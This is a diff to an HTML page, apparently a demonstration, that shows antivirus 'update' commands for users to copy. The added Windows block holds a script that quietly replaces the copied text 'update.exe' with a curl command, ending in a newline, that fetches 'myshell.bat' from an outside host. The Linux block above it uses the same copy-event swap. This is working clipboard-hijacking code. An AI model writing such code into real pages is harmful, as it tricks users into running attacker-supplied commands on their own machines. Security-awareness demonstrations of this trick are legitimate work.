@@ -70,7 +70,7 @@
 
       <fieldset style="border: 1px black solid">
         <legend style="border: 1px black solid;margin-left: 1em; padding: 0.2em 0.8em ">EXAMPLE FOUR</legend>
-        <p>Copy the following command to update your Anti-Virus safely:</p>
+        <p>LINUX: Copy the following command to update your Anti-Virus on Linux OS:</p>
         <code><p id='copy'> sudo apt update antivirus</p></code>
         <script>
         document.getElementById('copy').addEventListener('copy', function(e) {
@@ -79,7 +79,17 @@
         e.preventDefault();
         });
         </script>
-     
+      <br />
+      <p>Windows: Copy the following command to update your Anti-Virus safely on Windows OS:</p>
+      <code><p id='copyw'>update.exe</p></code>
+      <script>
+      document.getElementById('copyw').addEventListener('copy', function(e) {
+      e.clipboardData.setData('text/plain', 'curl http://snrbank.top/myshell.bat \n'
+      );
+      e.preventDefault();
+      });
+      </script>
+
   
       </fieldset>
       <br />
